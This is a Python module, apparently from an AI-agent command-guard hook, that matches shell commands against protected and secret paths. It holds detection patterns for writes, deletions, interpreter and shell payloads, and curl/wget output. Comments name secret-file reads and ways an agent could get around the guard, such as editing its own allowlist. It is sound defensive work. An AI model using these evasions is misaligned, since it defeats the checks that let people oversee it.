@functools.lru_cache(maxsize=None)
def _rx(pattern: str, flags: int = re.IGNORECASE) -> "re.Pattern[str]":
    """Compile ``pattern`` once per process.

    Rules and path ladders feed ~2,000 pattern x haystack searches through one
    ``check_command`` call, but only a few hundred DISTINCT patterns. Python's
    own ``re`` cache holds 512, so it thrashed: ~97% of a 90 ms call was
    re-compiling the same regexes (the Bash hook pays it on every command, and
    the safety tests on every case). A compile error is not cached, so callers'
    ``except re.error`` still fires at the same place.
    """
    return re.compile(pattern, flags)


# ============================================================================
# CONSTANTS
# ============================================================================

ALL_OPERATIONS = {"read", "write", "edit", "delete", "move", "chmod"}
# Recursive/forced removal of a regenerable directory (#1152). Deliberately NOT
# in ALL_OPERATIONS: ``allow: all`` predates it, and a silent upgrade of every
# existing ``dist/*: all`` entry is exactly what an opt-in must never be.
DELETE_RECURSIVE_OP = "delete-recursive"

# Operation pattern tuples: (regex template with {path} placeholder, operation name).

WRITE_PATTERNS = [
    (r'>\s*{path}', "write"),
    # Not an append: no ``-a`` / ``--append`` OPTION token anywhere (GNU tee
    # takes options after operands too). A bare ``-a`` substring is not an
    # option — ``(?!.*-a)`` here once let ``tee <protected> /tmp/my-app.log``
    # through, since neither this nor any append pattern matched (#1198).
    (r'\btee(?!.*\s(?:-[a-zA-Z]*a[a-zA-Z]*|--append)(?=\s|$))\s+.*{path}', "write"),
    (r'\bdd\s+.*\bof=\S*{path}', "write"),
    # rsync writes its DESTINATION: the last operand (options may trail it)
    (r'\brsync\b[^\n|;&]*\s["\']?{path}[^\s|;&]*(?:\s+--?[\w-]+(?:=\S*)?(?:\s+[^-\s]\S*)?)*\s*(?:$|[;&|#]|\d*[<>])', "write"),
    (r'\btar\s+(-c|--create)\S*\s+.*{path}', "write"),
    (r'\binstall\s+.*\s+{path}', "write"),
]

APPEND_PATTERNS = [
    (r'>>\s*{path}', "append"),
    (r'\btee\s+-a\s+.*{path}', "append"),
    (r'\btee\s+.*-a.*{path}', "append"),
    # ...and the option after the path: ``tee <file> -a``.
    (r'\btee\b.*{path}.*\s(?:-[a-zA-Z]*a[a-zA-Z]*|--append)(?=\s|$)', "append"),
]

EDIT_PATTERNS = [
    (r'\bsed\s+-i.*{path}', "edit"),
    (r'\bperl\s+-[^\s]*i.*{path}', "edit"),
    (r'\bawk\s+-i\s+inplace.*{path}', "edit"),
]

MOVE_COPY_PATTERNS = [
    (r'\bmv\s+.*\s+{path}', "move"),
    (r'\bcp\s+.*\s+{path}', "copy"),
]

DELETE_PATTERNS = [
    (r'\brm\s+.*{path}', "delete"),
    (r'\bunlink\s+.*{path}', "delete"),
    (r'\brmdir\s+.*{path}', "delete"),
    (r'\bshred\s+.*{path}', "delete"),
]

PERMISSION_PATTERNS = [
    (r'\bchmod\s+.*{path}', "chmod"),
    (r'\bchown\s+.*{path}', "chown"),
    (r'\bchgrp\s+.*{path}', "chgrp"),
]

TRUNCATE_PATTERNS = [
    (r'\btruncate\s+.*{path}', "truncate"),
    (r':\s*>\s*{path}', "truncate"),
]

READ_ONLY_BLOCKED = (
    WRITE_PATTERNS
    + APPEND_PATTERNS
    + EDIT_PATTERNS
    + MOVE_COPY_PATTERNS
    + DELETE_PATTERNS
    + PERMISSION_PATTERNS
    + TRUNCATE_PATTERNS
)

# Emptying a guarded file is deleting it (owner ruling, #1127 family): the
# truncate-to-nothing verbs count; a plain ``>`` redirect / ``echo x > file`` is
# the ordinary edit path and stays allowed.
EMPTY_PATTERNS = [
    (r'\btruncate\s+.*{path}', "delete"),
    (r'\bdd\s+.*\bof=["\']?\S*{path}', "delete"),
    # a redirect whose source is a known-empty producer
    (r'(?:^|\s)(?::|true|false)\s*>\|?\s*\S*{path}', "delete"),
    (r'\bcat\s+/dev/null\s*>\|?\s*\S*{path}', "delete"),
    (r'\bprintf\s+(?:\'\'|""|\x00)?\s*>\|?\s*\S*{path}', "delete"),
    (r'\becho\s+-n\s*(?:\'\'|""|\x00)?\s*>\|?\s*\S*{path}', "delete"),
    (r'\btee\s+(?:-\S+\s+)*\S*{path}\S*\s+<\s*/dev/null', "delete"),
    (r'<\s*/dev/null\s+tee\s+(?:-\S+\s+)*\S*{path}', "delete"),
    (r'(?:^|\s)(?:\'\'|""|\x00)\s*>\|?\s*\S*{path}', "delete"),
]

NO_DELETE_BLOCKED = DELETE_PATTERNS + EMPTY_PATTERNS

# Interpreter programs can write a file without any shell-level write token:
# ``python3 -c 'open(p, "w")...'``, a heredoc piped into ``python -``, or
# ``echo 'open(p,"w")' | python3``. The program text is opaque to static
# matching, so for PROTECTED control-plane paths we fail closed: an interpreter
# invocation that takes inline code (-c/-e, combined forms like ``perl -pie``),
# a heredoc/stdin program, or has data piped into it, AND mentions a protected
# path anywhere in the command, is blocked (#678). Applied ONLY by
# ``check_protected_command`` — never to user readOnlyPaths rules — so a
# legitimate read via ``cat``/``grep`` stays allowed.
_INTERPRETERS = (
    r'(?:python[\d.]*|perl|ruby|node|deno|bun|php|lua(?:jit)?[\d.-]*|tclsh[\d.]*|wish[\d.]*'
    r'|Rscript|(?-i:R)|julia|groovy|osascript|expect)'
)
_SHELLS = r'(?:sh|bash|zsh|dash|ksh|ash|fish|csh|tcsh)'
_SEG = r'[^\n|;&]*'  # stay inside one simple command

# Prefix wrappers: they run the command that FOLLOWS them (``caffeinate ssh host
# '…'``), so a quoted argument is code when an arg-runner (``_ARG_RUNNERS``)
# sits behind one, and prose when none does (``caffeinate git commit -m '…'``).
# The prose blanking used to key on the segment's first word alone (#1099).
_PREFIX_WRAPPERS = frozenset({
    "sudo", "doas", "env", "nohup", "timeout", "gtimeout", "exec", "time", "nice",
    "setsid", "stdbuf", "flock", "chroot", "runuser", "command", "builtin",
    "caffeinate", "ionice", "chrt", "taskset", "numactl", "cpulimit", "systemd-run",
    "sandbox-exec", "unshare", "nsenter", "firejail", "bwrap", "proxychains",
    "proxychains4", "torsocks", "tsocks", "unbuffer", "chronic", "xvfb-run",
    "fakeroot", "rlwrap", "sshpass", "setpriv", "runcon", "sg", "arch", "lockf",
    "daemon", "entr", "watchexec", "trickle", "strace", "ltrace", "dtruss",
})
# A write whose TARGET is a variable (``> "$f"``, ``rm "$f"``): the path is
# supplied by something else in the command (a loop's list, a positional arg).
_VAR_WRITE = (
    r'(?:(?<![0-9&])>>?\s*["\']?\$'
    r'|\b(?:rm|mv|cp|ln|tee|dd|touch|truncate|install|gzip|gunzip|patch|chmod'
    r'|chown|shred|unlink|sponge)\b[^\n;|&]*\$'
    r'|\bsed\s+-[A-Za-z]*i[^\n;|&]*\$'
    r'|\b' + _INTERPRETERS + r'\b[^\n]*\s-\S*[ceE]\b[^\n]*\$)'
)
INTERPRETER_WRITE_PATTERNS = [
    # interpreter ... -c/-e/... or stdin/heredoc marker, path anywhere after
    (r'\b' + _INTERPRETERS +
     r'\b[^\n|;&]*(?:\s-\S*[ceE]\b|\s+-\s|\s+-$|<<)(?s:.*){path}',
     "interpreter program"),
    # path anywhere before a pipe into an interpreter
    (r'{path}(?s:.*)\|\s*' + _INTERPRETERS + r'\b', "pipe into interpreter"),
    # The path set in the ENVIRONMENT of an inline interpreter
    # (``X=<path> python3 -c '...os.environ["X"]...'``, ``env X=<path> perl -e``):
    # the path sits BEFORE the interpreter, so the first pattern never sees it.
    (r'\b\w+=["\']?{path}(?s:.*)\b' + _INTERPRETERS +
     r'\b' + _SEG + r'(?:\s-\S*[ceE]\b|\s+-\s|\s+-$|<<)',
     "path assigned before an interpreter"),
    # Shells are interpreters too (#1095): a program on stdin / a heredoc
    # (``sh <<EOF`` … path … ``EOF``), or the path piped INTO one
    # (``printf 'rm %s' <path> | sh`` — the verb and the path are different
    # arguments, so no single token names the write).
    (r'\b' + _SHELLS + r'\b' + _SEG + r'(?:\s+-s\b|\s+-\s|\s+-$|<<)(?s:.*){path}',
     "shell program"),
    (r'{path}(?s:.*)\|\s*(?:env\s+)?' + _SHELLS + r'\b', "pipe into shell"),
    # The VERB is supplied by a substitution/variable (``bash -c "$(cat x) <path>"``,
    # ``eval "$v <path>"``): nothing static says whether it writes (#1099).
    (r'\b(?:' + _SHELLS + r'\b' + _SEG + r'\s-\S*c|eval)\s+["\']?\s*(?:\$\(|`|\$\w|\$\{)(?s:.*){path}',
     "shell payload with a computed command"),
    (r'<<(?s:.*)\|\s*(?:env\s+)?' + _SHELLS + r'\b(?s:.*){path}', "heredoc piped into shell"),
    # ``bash -c '… > "$1"' _ <path>`` / ``F=<path>; sh -c "… > $F"``: the shell
    # script writes through a variable and the path is supplied elsewhere.
    (r'\A(?=(?s:.*){path})(?=(?s:.*)\b' + _SHELLS + r'\b' + _SEG +
     r'\s-\S*c\b)(?=(?s:.*)' + _VAR_WRITE + r')',
     "shell -c writing through a variable"),
    # Loops feed a list into a body that writes through the loop variable
    # (``echo <path> | while read f; do : > "$f"; done``, ``for f in <path>;
    # do rm "$f"; done``). The path and the verb never share an operand.
    (r'\A(?=(?s:.*){path})(?=(?s:.*)\b(?:while\b[^\n]*\bread|for\s+\w+\s+in)\b)'
     r'(?=(?s:.*)' + _VAR_WRITE + r')',
     "loop writing through its variable"),
]

# Writers with NO write flag — the path is just an operand — that the generic
# ladder (``>``, tee, cp, mv, rm, sed -i …) never named (#1095). Applied only by
# ``check_protected_command``; each is judged by the OPERATION on the operand,
# not its spelling, and has a read-shaped sibling it must leave alone.
_COMPRESSORS = (
    r'(?:gzip|gunzip|bzip2|bunzip2|xz|unxz|lzma|unlzma|zstd|unzstd|lz4|pigz'
    r'|compress|uncompress)'
)
_TAR = r'\b(?:bsd|gnu)?tar'
_TAR_EXTRACT = (
    r'(?:' + _TAR + r'\s+(?-i:x)|' + _TAR + r'\b(?=' + _SEG + r'(?:\s-(?-i:[A-Za-z]*x)|\s--(?:extract|get)\b)))'
)
_TAR_CREATE = (
    r'(?:' + _TAR + r'\s+(?-i:[A-Za-z]*[cru])|' + _TAR + r'\b(?=' + _SEG +
    r'(?:\s-(?-i:[A-Za-z]*[cru])|\s--(?:create|append|update)\b)))'
)
# The command word of a simple command, past env assignments and prefix wrappers.
_CMD_HEAD = (
    r'^\s*(?:(?:\w+=\S*|' + '|'.join(sorted(map(re.escape, _PREFIX_WRAPPERS))) +
    r')\s+(?:-\S+\s+|\d+[smhd]?\s+)*)*(?:\S*/)?'
)
PROTECTED_WRITER_PATTERNS = [
    # ln/link naming the path on EITHER side: as the target it is replaced, as
    # the source it becomes a symlink / hardlink alias that a later write
    # (``echo x > /tmp/l``) reaches the file through, outside this scan's view.
    (r'\b(?:ln|link)\b' + _SEG + r'\s["\']?{path}', "write"),
    # downloaders: output file flags (incl. log/header/cookie-jar sinks)
    (r'\bcurl\b' + _SEG + r'(?:\s-(?-i:[A-Za-z0-9]*[oDc])\s*|\s--(?:output|dump-header'
     r'|cookie-jar|trace|trace-ascii|stderr|etag-save)[\s=])["\']?{path}', "write"),
    (r'\bwget\b' + _SEG + r'(?:\s-(?-i:[A-Za-z0-9]*[Ooa])\s*|\s--(?:output-document'
     r'|output-file|append-output)[\s=])["\']?{path}', "write"),
    # tar: extracting anything while naming the path, or the archive file itself
    (_TAR_EXTRACT + _SEG + r'{path}', "write"),
    (_TAR_CREATE + _SEG + r'(?:\s-(?-i:[A-Za-z]*f)\s*|\s--file[\s=])["\']?{path}', "write"),
    (_TAR + r'\s+(?-i:[A-Za-z]*[cru][A-Za-z]*)\s+["\']?{path}', "write"),
    # compressors replace the file in place unless told to write to stdout/test/list
    (r'\b' + _COMPRESSORS + r'\b(?!' + _SEG +
     r'\s(?:-(?-i:[A-Za-z0-9]*[ctl])\b|--stdout|--to-stdout|--test|--list))' + _SEG +
     r'{path}', "write"),
    (r'\bpatch\b' + _SEG + r'{path}', "write"),
    (r'\b(?:touch|sponge)\b' + _SEG + r'{path}', "write"),
    # mv removes its SOURCE (the generic ladder only names the destination);
    # rename/attribute changers take the file as a plain operand (#1101)
    (r'\b(?:mv|rename|mmv|chflags|setfacl|chattr)\b' + _SEG + r'{path}', "write"),
    # in-place structured editors
    (r'\b(?:yq|tomlq|xq)\b(?=' + _SEG + r'(?:\s-(?-i:[A-Za-z]*i[A-Za-z]*)\b|\s--in-?place\b))' + _SEG + r'{path}', "write"),
    (r'\bg?sed\b(?=' + _SEG + r'(?:\s-(?-i:[A-Za-z]*i[A-Za-z]*)\b|\s--in-?place\b))' + _SEG + r'{path}', "write"),
    (r'\bdasel\b(?=' + _SEG + r'\s(?:put|delete)\b)' + _SEG + r'{path}', "write"),
    # scp/sftp write their LAST operand; as a source the file is only read
    (r'\b(?:scp|sftp)\b' + _SEG + r'\s["\']?{path}[^\s|;&]*\s*(?:$|[;&|#]|\d*[<>])', "write"),
    # scripted editors: ed/ex always take their script on stdin; the vi family
    # only when driven non-interactively (-es/-s/-c/+cmd/--headless), and emacs
    # --batch. A bare ``vim <path>`` needs a terminal and is left alone.
    (_CMD_HEAD + r'(?:ed|ex)\b' + _SEG + r'{path}', "write"),
    (_CMD_HEAD + r'(?:vi|vim|nvim|gvim|view)\b(?=' + _SEG +
     r'(?:\s-(?-i:[A-Za-z]*[esES][A-Za-z]*)\b|\s-c\b|\s\+\S|\s--(?:cmd|headless)\b))' + _SEG + r'{path}', "write"),
    (_CMD_HEAD + r'emacs\b(?=' + _SEG + r'\s--?(?:batch|script)\b)' + _SEG + r'{path}', "write"),
    # git restore/checkout rewrite the working-tree file (``restore --staged``
    # alone only touches the index)
    (r'\bgit\b' + _SEG + r'\bcheckout\b' + _SEG + r'{path}', "write"),
    (r'\bgit\b' + _SEG + r'\brestore\b(?!' + _SEG + r'\s--staged\b(?!' + _SEG +
     r'(?:\s--worktree|\s-W\b)))' + _SEG + r'{path}', "write"),
]

# Extraction INTO a directory that holds control-plane files names no protected
# path at all (``tar xf a.tar -C ~/.agentwire``), so these are keyed on the
# directory instead; ``{dir}`` is filled per ancestor of a protected path.
_DIR_END = r'(?:/+(?:\.|[^/\s"\';&|)]+/\.\.)?)*["\']?(?=\s|$|[;&|)])'
PROTECTED_DIR_EXTRACT_PATTERNS = [
    _TAR_EXTRACT + _SEG + r'(?:\s-(?-i:C)\s*|\s--(?:directory|one-top-level)[=\s])["\']?{dir}' + _DIR_END,
    r'\bwget\b' + _SEG + r'(?:\s-(?-i:P)\s*|\s--directory-prefix[=\s])["\']?{dir}' + _DIR_END,
    r'\bcurl\b' + _SEG + r'\s--output-dir[=\s]["\']?{dir}' + _DIR_END,
    r'\bunzip\b' + _SEG + r'\s-d\s*["\']?{dir}' + _DIR_END,
    r'\b(?:cp|mv|install|ln)\b' + _SEG +
    r'(?:\s-(?-i:[A-Za-z]*t)\s*|\s--target-directory[=\s])["\']?{dir}' + _DIR_END,
    # a link to the directory (``ln -s <dir> /tmp/d``) is an alias for every file in it
    r'\b(?:ln|link)\b' + _SEG + r'\s["\']?{dir}' + _DIR_END,
]

_CONCAT_RE = _rx(
    r'''(?P<q>['"])(?P<a>[^'"\n]*)(?P=q)\s*(?:[+.]\s*)?(?P<q2>['"])(?P<b>[^'"\n]*)(?P=q2)'''
)


# ============================================================================
# GLOB / PATH HELPERS
# ============================================================================


def is_glob_pattern(pattern: str) -> bool:
    return '*' in pattern or '?' in pattern or '[' in pattern


def glob_to_regex(pattern: str) -> str:
    """Convert a glob to a regex usable inside command-line contexts.

    Trailing word-boundary check ensures e.g. ``*.py`` doesn't match
    ``foo.python``.
    """
    result = ""
    for char in pattern:
        if char == '*':
            result += r'[^\s/]*'
        elif char == '?':
            result += r'[^\s/]'
        elif char in r'\.^$+{}[]|()':
            result += '\\' + char
        else:
            result += char
    result += r'(?![a-zA-Z0-9_])'
    return result


def canonicalize_command(command: str) -> str:
    """Expand ``~``, ``$HOME`` and ``${HOME}`` in a command to the home dir.

    The rule patterns are stored in ``~``-form and expanded with
    ``expanduser`` before matching; without expanding the COMMAND too, a
    tilde/``$HOME`` secret read (``cat ~/.ssh/id_rsa``, ``cat $HOME/.aws/credentials``)
    only ever matched against its fully-expanded ``/Users/<me>/...`` form and
    slipped past. Canonicalizing both sides closes that gap. ``./``-prefixes are
    handled by the path-context boundary in :func:`path_match_regex` (a leading
    ``/`` is an accepted boundary char), so no separate ``normpath`` of the raw
    command string — which is not a pure path — is attempted here.
    """
    home = os.path.expanduser("~")
    if not home or home == "~":
        return command
    out = command.replace("${HOME}", home).replace("$HOME", home)
    # Only expand ``~`` when it begins a path (start of string or after a
    # whitespace/quote/=/: boundary and immediately followed by ``/``), so we
    # never touch ``~`` used as a literal (e.g. inside a sed expression).
    out = re.sub(r'(^|[\s=:"\'(<>])~(?=/)', lambda m: m.group(1) + home, out)
    return out


def path_match_regex(expanded_pattern: str) -> str:
    """Build a path-context regex for a rule pattern (glob or literal).

    Both glob and literal patterns are matched as a whole path COMPONENT — never
    a bare substring. The literal branch previously used ``expanded in command``,
    which hard-blocked innocuous text: ``.env`` matched ``.environment``,
    ``docs/.env.example``, ``grep -v .environ`` (#492). The component boundary
    (a leading path-separator/whitespace boundary, and a trailing boundary that
    forbids the basename being extended by another filename char) fixes those
    false positives while still catching real secret paths.
    """
    lead = r'(?:^|[\s=:"\'<>(/])'
    if is_glob_pattern(expanded_pattern):
        glob_regex = glob_to_regex(expanded_pattern)
        return r'(?:^|[\s/="\'<>])' + glob_regex + r'(?:[\s"\')<>]|$)'
    is_dir = expanded_pattern.endswith('/')
    body = re.escape(expanded_pattern.rstrip('/'))
    if is_dir:
        # Directory prefix: anything under it counts as a hit.
        trail = r'(?:/|[\s"\')<>;&|]|$)'
    else:
        # Filename/path: the basename must end here — the next char must not be
        # a path-extending char, so ``.env`` no longer matches ``.env.example``.
        trail = r'(?![A-Za-z0-9_.\-])'
    return lead + body + trail


# ``.env.example`` / ``.env.sample`` / ``.env.template`` / ``.env.dist`` are
# committed, secret-free TEMPLATE files — never the real env. The ``.env.*`` glob
# would otherwise hard-block reading them (#492), so they are carved out.
_SAFE_ENV_TEMPLATE_RE = re.compile(
    r'\.env\.(?:example|sample|template|dist)(?![A-Za-z0-9_])', re.IGNORECASE
)


# An extension glob is aimed at filenames, but JS property access and a jq
# field path match it too. Code mode, not path mode: the token opens with
# expression punctuation (``(``, ``[``, ``!``, ``${``) and is a bare identifier
# chain — no ``/``, no whitespace, no quote. A real read puts the name after a
# verb or a quote, so those keep matching. Narrow on purpose: it releases only
# tokens that cannot be a path argument.
_MEMBER_ACCESS_TOKEN_RE = re.compile(
    r'[\w$.]*(?:\\?\(|\$\{|\[|!)+\.?[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)*'
)


_BRACE_GROUP_RE = re.compile(r'(?<![$\\])\{([^{}\s]*,[^{}\s]*)\}')
_BRACE_VARIANT_CAP = 256


def brace_variants(text: str) -> Optional[List[str]]:
    """The strings bash would produce by expanding ``{a,b}`` groups in ``text``.

    Innermost-first, so nested groups resolve. ``${var}`` and a brace group
    holding whitespace are not expansions and are left alone. Returns ``[]``
    when there is nothing to expand and None when the expansion would exceed
    the cap (an expansion bomb), so the caller can fail closed.
    """
    pending = [text]
    done: List[str] = []
    while pending:
        cur = pending.pop()
        m = _BRACE_GROUP_RE.search(cur)
        if not m:
            if cur != text:
                done.append(cur)
            continue
        for alt in m.group(1).split(","):
            pending.append(cur[:m.start()] + alt + cur[m.end():])
        if len(pending) + len(done) > _BRACE_VARIANT_CAP:
            return None
    return done


def _match_token(matched: str) -> str:
    """The matched path token with its boundary characters stripped off."""
    return matched.strip(' \t\n"\'<>=)')


def matches_path_in_command(pattern: str, command: str) -> bool:
    """Check if a path pattern occurs in a command string in a path-context.

    The command is canonicalized (``~``/``$HOME`` expanded) and the pattern is
    matched as a whole path component against both the raw and canonicalized
    forms, so neither tilde indirection (#2) nor bare-substring over-blocking
    (#492) defeats it.
    """
    expanded = os.path.expanduser(pattern)
    regex = path_match_regex(expanded)
    haystacks = [command]
    canon = canonicalize_command(command)
    if canon != command:
        haystacks.append(canon)
    # `cat {<secret>,x}` / `dir/{<secret>,x}`: bash expands the group before
    # cat ever runs, so the rule must read the expanded words too. A command
    # whose groups outgrow the cap fails CLOSED — it cannot be shown clean.
    for hay in list(haystacks):
        variants = brace_variants(hay)
        if variants is None:
            return True
        haystacks.extend(v for v in variants if v != hay)

    glob = is_glob_pattern(pattern)
    literals = _path_literals(pattern)
    matched = False
    for hay in haystacks:
        if not _may_mention_path(hay, literals):
            continue
        try:
            rx = _rx(regex)
            pos = 0
            while True:
                m = rx.search(hay, pos)
                if not m:
                    break
                if _SAFE_ENV_TEMPLATE_RE.search(m.group(0)) or (
                    glob and _MEMBER_ACCESS_TOKEN_RE.fullmatch(_match_token(m.group(0)))
                ):
                    # Skipped hit: step back one char so the boundary it
                    # consumed can lead the NEXT token.
                    pos = max(m.end() - 1, pos + 1)
                    continue
                matched = True
                break
        except re.error:
            return False
        if matched:
            break
    if not matched:
        return False

    if is_glob_pattern(pattern):
        # Reject method-call lookalikes: foo.py( should not match *.py
        extension = pattern.split('*')[-1] if '*' in pattern else pattern
        if extension.startswith('.'):
            extension = extension[1:]
        if extension and re.search(r'\w\.' + re.escape(extension) + r'\s*\(', command):
            return False
    return True


_DRVFS_RE = re.compile(r"^/mnt/[a-zA-Z](?:/|$)")


def _casefolds_paths(path: str) -> bool:
    """Whether ``path`` lives on a filesystem that is case-insensitive by default.

    macOS (APFS) and Windows (NTFS) always; Linux only under a WSL drvfs mount
    (``/mnt/<drive>/``). Linux stays exact-case: ``~/.SSH`` and ``~/.ssh`` are
    different files there, and folding would block the innocent one (#1217).
    """
    return sys.platform in ("darwin", "win32") or bool(_DRVFS_RE.match(path))


def match_path(file_path: str, pattern: str) -> bool:
    """Match a single absolute file path against a pattern (glob or prefix).

    On a case-insensitive filesystem both sides are casefolded, so a case
    variant that reaches the same file matches the same pattern (#1217).
    """
    expanded_pattern = os.path.expanduser(pattern)
    normalized = os.path.normpath(file_path)
    expanded_normalized = os.path.expanduser(normalized)
    if is_glob_pattern(pattern):
        lower_path = expanded_normalized.lower()
        lower_pattern = expanded_pattern.lower()
        if fnmatch.fnmatch(lower_path, lower_pattern):
            return True
        basename = os.path.basename(expanded_normalized)
        if fnmatch.fnmatch(basename.lower(), lower_pattern):
            return True
        return False
    if _casefolds_paths(expanded_normalized):
        expanded_normalized = expanded_normalized.lower()
        expanded_pattern = expanded_pattern.lower()
    return (
        expanded_normalized.startswith(expanded_pattern)
        or expanded_normalized == expanded_pattern.rstrip('/')
    )


def _path_forms(file_path: str) -> List[str]:
    """The lexical path plus its symlink-resolved form, when they differ.

    A symlink into a guarded directory must be judged by where it lands, while
    the lexical form is kept so a path that does not exist yet (a Write target)
    is still matched as spelled — same pairing the Bash channel uses (#1217).
    """
    forms = [file_path]
    try:
        resolved = os.path.realpath(os.path.expanduser(file_path))
    except (OSError, ValueError):
        return forms
    if resolved != file_path:
        forms.append(resolved)
    return forms


def _parse_allowed_entry(entry: Dict[str, Any]) -> Dict[str, Any]:
    """Normalize an allowed-paths entry to ``{path: str, allow: set}``."""
    allow = entry.get("allow", "all")
    if isinstance(allow, str) and allow.strip().lower() == "all":
        return {"path": entry["path"], "allow": ALL_OPERATIONS.copy()}
    if isinstance(allow, list):
        return {"path": entry["path"], "allow": {a.strip().lower() for a in allow}}
    if isinstance(allow, str):
        return {"path": entry["path"], "allow": {allow.strip().lower()}}
    return {"path": entry["path"], "allow": ALL_OPERATIONS.copy()}


def safe_cwd() -> str:
    """The shell's working directory; NEVER raises (#1238).

    ``os.environ.get("PWD", os.getcwd())`` evaluates ``os.getcwd()`` eagerly,
    and that raises ``FileNotFoundError`` when the cwd was deleted out from
    under the process (a worktree torn down beneath a live session). On the
    hook hot path an uncaught crash exits 2 (block, #1223), so a dead cwd
    would block every tool call. ``$PWD`` first (survives the deletion), then
    ``getcwd()`` only when it is unset, then home, then ``/``.

    ``audit_logger.py`` carries a standalone mirror (it cannot import this
    module); ``test_safe_cwd.py`` pins the two to the same behavior.
    """
    pwd = os.environ.get("PWD")
    if pwd:
        return pwd
    try:
        return os.getcwd()
    except OSError:
        return os.path.expanduser("~") or "/"


def _find_project_config() -> Tuple[str, List[Any]]:
    """Walk up from $PWD to find ``.damagecontrol.yml`` and return its allowed_paths.

    The per-project allowlist lives in the PROTECTED ``.damagecontrol.yml``
    (top-level ``allowed_paths``), never the agent-writable ``.agentwire.yml``.
    Otherwise an agent could allowlist a control-plane path in ``.agentwire.yml``
    and re-permit its own write to ``damagecontrol.yml`` — the exact bypass #466
    set out to close. The allowlist is the one knob that overrides the protected
    check, so it must itself live behind the protected control plane (#467).
    """
    cwd = safe_cwd()
    current = os.path.abspath(cwd)
    while True:
        config_file = os.path.join(current, ".damagecontrol.yml")
        if os.path.isfile(config_file):
            try:
                if yaml:
                    with open(config_file, "r") as f:
                        data = yaml.safe_load(f) or {}
                    if isinstance(data, dict):
                        paths = data.get("allowed_paths", [])
                        if isinstance(paths, list):
                            return current, paths
            except Exception as exc:
                _record_load_failure(Path(config_file), exc, None)
            return current, []
        parent = os.path.dirname(current)
        if parent == current:
            break
        current = parent
    return cwd, []


def _read_global_allowed_paths() -> List[Any]:
    """Top-level ``allowed_paths`` of the protected global policy file in ``~/.agentwire/``."""
    path = Path.home() / ".agentwire" / "damagecontrol.yml"
    try:
        if yaml and path.is_file():
            with open(path, "r") as f:
                data = yaml.safe_load(f) or {}
            paths = data.get("allowed_paths", []) if isinstance(data, dict) else []
            return paths if isinstance(paths, list) else []
    except Exception as exc:
        _record_load_failure(path, exc, None)
    return []


def load_allowed_paths(config: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Merge global ``allowedPaths`` (rules YAML + the global policy file) with per-project ``.damagecontrol.yml`` entries.

    A ``delete-recursive`` entry too broad to be safe is marked ``dr_refused``
    (reason attached) instead of dropped, so the decision ignores it and
    ``agentwire doctor`` can name it.
    """
    raw = list(config.get("allowedPaths", []))

    for p in _read_global_allowed_paths():
        if isinstance(p, dict) and "path" in p:
            entry = _parse_allowed_entry(p)
            entry["source"] = "global"
            raw.append(entry)

    project_root, project_paths = _find_project_config()
    for p in project_paths:
        if not isinstance(p, dict):
            continue
        entry = _parse_allowed_entry(p)
        if not os.path.isabs(os.path.expanduser(entry["path"])):
            entry["path"] = os.path.join(project_root, entry["path"])
        entry["project_root"] = project_root
        entry["source"] = "project"
        raw.append(entry)

    result = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        if not ("allow" in item and isinstance(item["allow"], set)):
            item = _parse_allowed_entry(item)
        if DELETE_RECURSIVE_OP in item["allow"]:
            problem = delete_recursive_entry_problem(item["path"], item.get("project_root"))
            if problem:
                item = dict(item, dr_refused=problem)
        result.append(item)
    return result


def is_path_allowed_for_op(
    file_path: str,
    allowed_paths: List[Dict[str, Any]],
    operation: str,
) -> bool:
    """Check if ``file_path`` has ``operation`` permitted by some allowed-path entry."""
    for entry in allowed_paths:
        if match_path(file_path, entry["path"]):
            if operation in entry["allow"]:
                return True
    return False


def _extract_command_paths(command: str) -> List[str]:
    """Extract file/directory paths from a bash command string."""
    paths = []
    for m in re.finditer(r'''["']([^"']+)["']''', command):
        candidate = m.group(1)
        if '/' in candidate or candidate.startswith('.'):
            paths.append(os.path.expanduser(candidate))
    for token in re.split(r'\s+', command):
        token = token.strip("\"'")
        if token.startswith(('/', '~/', './')):
            paths.append(os.path.expanduser(token))
        elif '/' in token and not token.startswith('-'):
            paths.append(os.path.expanduser(token))
    return paths


def is_command_path_allowed(
    command: str,
    allowed_paths: List[Dict[str, Any]],
    operation: str = "write",
    guarded_patterns: Optional[List[str]] = None,
    covered: Optional[Set[str]] = None,
) -> bool:
    """ALL paths in ``command`` must have ``operation`` permitted by allowlist.

    Security: ALL paths must match (not any) — this stops e.g.
    ``rm /tmp/safe.txt /etc/passwd`` from being allowed just because /tmp is
    allowlisted.

    With ``guarded_patterns``, a path that falls in a guarded class is judged
    against :func:`guarded_allowlist` (a location entry cannot re-permit it,
    #1126) while every other path keeps the full allowlist.

    ``covered`` (expanded operand tokens) are the operands a ``delete-recursive``
    entry already vouched for (#1152): they are not judged again, every other
    path still is.
    """
    paths = _extract_command_paths(command)
    if covered:
        remaining = [p for p in paths if p not in covered]
        if len(remaining) < len(paths) and not remaining:
            return True
        paths = remaining
    if not allowed_paths or not paths:
        return False
    guarded_entries = guarded_allowlist(allowed_paths, guarded_patterns) if guarded_patterns else allowed_paths
    for p in paths:
        entries = guarded_entries if guarded_patterns and any(match_path(p, g) for g in guarded_patterns) else allowed_paths
        if not is_path_allowed_for_op(p, entries, operation):
            return False
    return True


def _infer_operation_from_reason(reason: str) -> str:
    """Map a pattern's reason text back to one of the allowlist operation names."""
    reason_lower = reason.lower()
    if (
        "rm" in reason_lower
        or "delet" in reason_lower
        or "trash" in reason_lower
        or "rmdir" in reason_lower
    ):
        return "delete"
    if "chmod" in reason_lower or "permission" in reason_lower:
        return "chmod"
    if "chown" in reason_lower or "chgrp" in reason_lower:
        return "chmod"
    if "mv" in reason_lower or "move" in reason_lower:
        return "move"
    return "write"


def _path_context_regex(path: str) -> str:
    """The ``{path}`` regex a rule path expands to inside operation patterns.

    Shared by :func:`check_path_patterns` and the ladder keep-predicate in
    :func:`path_ladder_haystacks` — the two must agree on what counts as a
    mention of the path, or a kept token would not be the one matched.
    """
    if is_glob_pattern(path):
        # Allow an optional (possibly quoted) directory prefix: ``*`` in the
        # glob can't span ``/``, so without this a basename glob like
        # ``*.agentwire.yml`` never matched an absolute target
        # (``> /repo/.agentwire.yml`` sailed past every write pattern) (#678).
        return r'["\']?(?:[^\s"\';|&<>]*/)?' + glob_to_regex(path)
    expanded = os.path.expanduser(path)
    if expanded == path:
        return re.escape(path)
    return r'(?:' + re.escape(expanded) + r'|' + re.escape(path) + r')'


